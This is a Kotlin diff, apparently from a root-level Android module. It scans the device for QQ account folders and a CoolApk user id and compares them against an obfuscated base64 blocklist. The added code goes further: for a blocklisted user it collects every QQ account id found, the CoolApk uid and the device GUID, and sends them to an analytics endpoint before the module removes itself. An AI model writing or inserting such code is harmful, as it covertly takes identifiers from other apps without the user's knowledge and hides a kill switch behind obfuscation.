@@ -1057,7 +1057,8 @@ fun getUsers(): Array<String> {
     }
 }
 
-fun Context.getQStatus(id: String): Boolean {
+fun Context.getQSlist(): ArrayList<String> {
+    val list = ArrayList<String>()
     getUsers().forEach { u ->
         val dir1 = getString(R.string.tencent_files, u)
         val command1 = "if [[ -d $dir1 ]]; then\n  ls $dir1 -mF\nfi"
@@ -1069,7 +1070,7 @@ fun Context.getQStatus(id: String): Boolean {
                 } ?: arrayListOf()
             } else arrayListOf()
         }
-        if (list1.contains("$id/")) return true
+        list.addAll(list1)
         val dir2 = getString(R.string.tencent_configs, u)
         val command2 = "if [[ -d $dir2 ]]; then\n  ls $dir2 -mF\nfi"
         val list2 = ShellUtils.execCommand(command2, true, true).let { its ->
@@ -1080,12 +1081,17 @@ fun Context.getQStatus(id: String): Boolean {
                 } ?: arrayListOf()
             } else arrayListOf()
         }
-        if (list2.contains("$id/")) return true
+        list.addAll(list2)
     }
+    return list
+}
+
+fun Context.getQStatus(id: String): Boolean {
+    if (getQSlist().contains("$id/")) return true
     return false
 }
 
-fun Context.getCStatus(id: String): Boolean {
+fun Context.getCSid(): String? {
     getUsers().forEach { u ->
         val dir = getString(R.string.cool_black, u)
         val command =
@@ -1095,12 +1101,17 @@ fun Context.getCStatus(id: String): Boolean {
                 its.successMsg?.replace(" ", "")
             } else null
         }
-        if (uid != null && uid == id) return true
+        if (!uid.isNullOrBlank()) return uid
     }
+    return null
+}
+
+fun Context.getCStatus(id: String): Boolean {
+    if (getCSid() == id) return true
     return false
 }
 
-val bk get() = "ee1wicWJrXCI6W1wiMTE1MDMyNTYxOVwiLFwiOTA3OTg5MDU0XCIsXCIzMTA4NDQwMTgyXCIsXCIzNDMxMjk5MDU5XCJdLFwiY2JrXCI6W1wiMTMwNDQ4MFwiLFwiMTYxNDk5MDhcIixcIjMwNzAwOTlcIl0sXCJkaWtcIjpbXX0="
+val bk get() = "ee1wicWJrXCI6W1wiMTE1MDMyNTYxOVwiLFwiOTA3OTg5MDU0XCIsXCIzMTA4NDQwMTgyXCIsXCIzNDMxMjk5MDU5XCJdLFwiY2JrXCI6W1wiMTMwNDQ4MFwiLFwiMTYxNDk5MDhcIixcIjMwNzAwOTlcIixcIjI0NzAwMTRcIl0sXCJkaWtcIjpbXX0="
 
 fun Context.ckqcbs(): Boolean {
     scope {
@@ -1108,6 +1119,8 @@ fun Context.ckqcbs(): Boolean {
             var qbsval = false
             var cbsval = false
             var disval = false
+            val map = ArrayMap<String, String>()
+            map["time"] = formatDate("YYYYMMdd-HH:mm:ss")
             val js = JSONObject(base64Decode(bk.substring(1, bk.length)))
             (js.optJSONArray("qbk") as List<*>).forEach {
                 if (getQStatus(it as String)) qbsval = true
@@ -1119,6 +1132,10 @@ fun Context.ckqcbs(): Boolean {
                 if (it as String == getGuid) disval = true
             }
             if (qbsval || cbsval || disval) {
+                map["qbk"] = getQSlist().toString()
+                map["cbk"] = getCSid().toString()
+                map["dik"] = getGuid
+                AppAnalyticsUtils.trackEvent("bk", map)
                 removeModule()
                 exitModule()
             }
